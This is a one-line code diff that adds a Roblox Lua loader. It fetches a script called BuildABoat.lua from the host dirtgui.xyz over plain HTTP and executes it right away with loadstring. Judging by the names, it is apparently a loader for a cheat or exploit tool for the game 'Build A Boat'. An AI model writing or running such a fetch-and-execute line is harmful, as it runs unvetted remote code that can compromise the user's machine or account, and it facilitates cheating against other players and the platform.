@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://dirtgui.xyz/BuildABoat.lua",true))()
